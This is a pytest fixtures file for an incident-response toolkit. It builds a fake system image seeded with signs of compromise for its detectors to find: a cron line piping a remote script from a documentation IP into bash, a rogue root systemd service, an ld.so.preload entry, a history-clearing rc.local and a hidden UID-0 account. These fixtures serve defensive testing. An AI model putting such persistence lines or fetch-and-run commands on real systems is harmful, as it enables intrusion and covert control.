"""Shared pytest fixtures.

Every collector test runs against a synthetic filesystem root so the suite never
reads the developer's real ``/etc``, ``/var/log`` or home directories.  Read-only
commands are stubbed out for the same reason: unit tests must be hermetic and
must never execute host utilities.
"""

from __future__ import annotations

import base64
import logging
import os
from pathlib import Path

import pytest

from irkit.collectors.base import CollectorContext
from irkit.config import Limits, SystemPaths, Thresholds, ToolkitConfig
from irkit.evidence import EvidenceManager
from irkit.findings import FindingsFactory
from irkit.utils import CommandResult


def write(path: Path, text: str, mode: int | None = None) -> Path:
    """Create a parent directory, write text and optionally set permissions."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    if mode is not None:
        os.chmod(path, mode)
    return path


@pytest.fixture(autouse=True)
def stub_commands(monkeypatch: pytest.MonkeyPatch) -> None:
    """Prevent unit tests from executing real host utilities."""

    def fake_command(self, argv, description, *, record=True):  # noqa: ANN001, ANN202
        return CommandResult(
            argv=[str(part) for part in argv],
            ok=True,
            returncode=0,
            stdout="",
            stderr="",
            error=None,
        )

    monkeypatch.setattr("irkit.collectors.base.BaseCollector.command", fake_command)


@pytest.fixture
def fake_root(tmp_path: Path) -> Path:
    """A small but realistic system image used by the collector tests."""
    root = tmp_path / "root"
    etc = root / "etc"

    write(
        etc / "os-release",
        'NAME="Debian GNU/Linux"\nVERSION_ID="12"\nID=debian\nPRETTY_NAME="Debian 12 (test)"\n',
    )
    write(etc / "hostname", "lab-host\n")

    write(
        etc / "passwd",
        "\n".join(
            [
                "root:x:0:0:root:/root:/bin/bash",
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "svc:x:999:999:service account:/var/lib/svc:/bin/bash",
                "alice:x:1000:1000:Alice:/home/alice:/bin/bash",
                "ghost:x:0:0:Ghost:/home/ghost:/bin/bash",
                "dup1:x:1001:1001:Dup One:/home/dup1:/bin/bash",
                "dup2:x:1001:1001:Dup Two:/home/dup2:/bin/bash",
            ]
        )
        + "\n",
    )
    write(
        etc / "passwd-",
        "\n".join(
            [
                "root:x:0:0:root:/root:/bin/bash",
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "svc:x:999:999:service account:/var/lib/svc:/bin/bash",
                "alice:x:1000:1000:Alice:/home/alice:/bin/bash",
                "dup1:x:1001:1001:Dup One:/home/dup1:/bin/bash",
            ]
        )
        + "\n",
    )
    write(
        etc / "group",
        "root:x:0:\nsudo:x:27:alice\nwheel:x:10:alice\nalice:x:1000:\n",
    )
    write(
        etc / "shadow",
        "\n".join(
            [
                "root:!:19000:0:99999:7:::",
                "daemon:*:19000:0:99999:7:::",
                "svc:!:19000:0:99999:7:::",
                "alice::19000:0:99999:7:::",
                "ghost:!:19000:0:99999:7:::",
                "dup1:!:19000:0:99999:7:::",
                "dup2:!:19000:0:99999:7:::",
            ]
        )
        + "\n",
        mode=0o640,
    )
    write(etc / "sudoers", "Defaults env_reset\nalice ALL=(ALL:ALL) NOPASSWD: ALL\n", mode=0o440)
    write(etc / "sudoers.d" / "ops", "ops ALL=(ALL) ALL\n", mode=0o440)

    # Home directories.  alice has a world-writable authorized_keys file and an
    # exposed private key; both must be reported without reading key content.
    alice_home = root / "home" / "alice"
    write(
        alice_home / ".ssh" / "authorized_keys",
        f"ssh-ed25519 {base64.b64encode(b'test key blob').decode()} alice@test\n",
        mode=0o666,
    )
    write(
        alice_home / ".ssh" / "id_rsa",
        "-----BEGIN OPENSSH PRIVATE KEY-----\nSHOULD-NOT-BE-HASHED\n-----END OPENSSH PRIVATE KEY-----\n",
        mode=0o644,
    )
    for name in ("ghost", "dup1", "dup2"):
        (root / "home" / name).mkdir(parents=True, exist_ok=True)

    write(
        etc / "ssh" / "sshd_config",
        "\n".join(
            [
                "PermitRootLogin yes",
                "PasswordAuthentication yes",
                "MaxAuthTries 10",
                "AuthorizedKeysFile .ssh/authorized_keys",
            ]
        )
        + "\n",
    )

    auth_lines = [
        "2026-11-17T10:00:00Z lab-host sshd[1000]: Accepted password for root from 198.51.100.7 port 2200 ssh2",
    ]
    for index in range(12):
        auth_lines.append(
            "2026-11-17T10:0"
            f"{index % 10}:00Z lab-host sshd[1001]: Failed password for invalid user bob "
            "from 203.0.113.5 port 4444 ssh2"
        )
    auth_lines.append(
        "2026-11-17T10:20:00Z lab-host sshd[1002]: Accepted password for alice from 203.0.113.5 port 5555 ssh2"
    )
    auth_lines.append(
        "2026-11-17T10:21:00Z lab-host sudo: alice : TTY=pts/0 ; PWD=/home/alice ; "
        "USER=root ; COMMAND=/usr/bin/id"
    )
    auth_lines.append(
        "2026-11-17T10:22:00Z lab-host useradd[1003]: new user: name=backdoor, UID=1002, "
        "GID=1002, home=/home/backdoor, shell=/bin/bash"
    )
    write(root / "var" / "log" / "auth.log", "\n".join(auth_lines) + "\n")

    write(
        etc / "systemd" / "system" / "evil.service",
        "\n".join(
            [
                "[Unit]",
                "Description=Totally legitimate helper",
                "[Service]",
                "User=root",
                "ExecStart=/tmp/.hidden/payload --quiet",
                "[Install]",
                "WantedBy=multi-user.target",
            ]
        )
        + "\n",
    )
    write(
        etc / "systemd" / "system" / "normal.service",
        "\n".join(
            [
                "[Unit]",
                "Description=Normal system unit",
                "[Service]",
                "ExecStart=systemd-dissect --attach --loop-ref-auto %f",
            ]
        )
        + "\n",
    )
    write(etc / "cron.d" / "backup", "* * * * * root curl http://198.51.100.9/x.sh | bash\n")
    write(etc / "ld.so.preload", "/tmp/evil.so\n")
    write(etc / "rc.local", "#!/bin/sh\nhistory -c\n", mode=0o755)

    write(root / "tmp" / ".hidden-payload", "#!/bin/sh\necho payload\n", mode=0o755)
    write(root / "tmp" / "visible-payload", "#!/bin/sh\necho payload\n", mode=0o755)
    write(root / "home" / "alice" / "tool", "#!/bin/sh\necho tool\n", mode=0o4755)

    write(etc / "fstab", "/dev/sda1 / ext4 defaults 0 1\n")
    write(etc / "login.defs", "UID_MIN 1000\nUID_MAX 60000\n")
    write(etc / "security" / "limits.conf", "* hard core 0\n", mode=0o666)
    # Masked units are symlinks to /dev/null; their own mode is always 777 and
    # must not be reported as a world-writable configuration file.
    (etc / "systemd" / "system" / "masked.service").symlink_to("/dev/null")
    return root


@pytest.fixture
def config(fake_root: Path) -> ToolkitConfig:
    return ToolkitConfig(
        paths=SystemPaths.from_root(fake_root),
        limits=Limits(),
        thresholds=Thresholds(),
        redact_output=True,
    )


@pytest.fixture
def collector_context(config: ToolkitConfig) -> CollectorContext:
    logger = logging.getLogger("irkit.tests")
    return CollectorContext(
        config=config,
        evidence=EvidenceManager(config.paths, config.limits, logger),
        findings=FindingsFactory(config.limits),
        logger=logger,
        is_root=False,
    )


@pytest.fixture
def investigation_document(fake_root: Path):
    """A real investigation document produced from the synthetic root."""
    from irkit.context import Investigation

    config = ToolkitConfig(paths=SystemPaths.from_root(fake_root), redact_output=True)
    investigation = Investigation(config, is_root=False, command=["pytest"])
    return investigation.run(["users"])
